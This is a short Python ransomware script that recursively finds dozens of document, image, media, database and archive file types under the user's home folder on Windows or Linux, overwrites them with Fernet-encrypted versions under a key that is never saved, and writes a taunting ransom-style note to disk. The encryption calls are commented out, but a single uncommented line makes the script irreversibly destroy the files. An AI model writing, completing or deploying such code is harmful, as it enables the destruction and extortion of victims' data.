from cryptography.fernet import Fernet, MultiFernet
from pathlib import Path
import random
import os


fkey = Fernet.generate_key()

q = ['whoopsy daisy\nyou fucked up','you were not\nspared by the butcher','hand becomes fist\nturnt against you']
r = random.choice(q)
s = os.name
types = ('*.doc','*.docx','*.txt','*.csv','*.xls','*.xlsx','*.pdf','*.xlsm','*.rtf','*.png','*.jpg','*.jpeg',
       '*.bmp','*.gif','*.aif','*.wma','*.mp3','*.ogg','*.mpa','*.wav','*.wmv','*.m4v','*.flv','*.mov',
       '*.mpg','*.mpeg','*.mp4','*.mkv','*.avi','*.dat','*.xml','*.db','*.log','*.tar','*.tar.gz',
       '*.sav','*.ppt,','*.pptx','*.odp','*.pps','*.7z','*.pkg','*.zip','*.rar')
u = os.getlogin()


def encrypt(filename, key):

    f = Fernet(key)

    with open(filename, "rb") as file:
        file_data = file.read()

    encrypted_data = f.encrypt(file_data)

    with open(filename, "wb") as file:
        file.write(encrypted_data)
        file.close()


def w_encrypt():

    for files in types:

        for i in Path(f'C:/Users/{u}').rglob(files):
            # encrypt(i, fkey)
            pass

    os.chdir(f'C:/Users/{u}/Desktop')


def p_encrypt():

    for files in types:

        for i in Path(f'/home/{u}').rglob(files):
            # encrypt(i, fkey)
            pass

    os.chdir(f'/home/{u}')


def main():

    if s == 'nt':
        w_encrypt()
    elif s == 'posix':
        p_encrypt()


    with open('badf00.txt', 'w') as file:
        file.write(r)
        file.close()


if __name__ == '__main__':
    main()
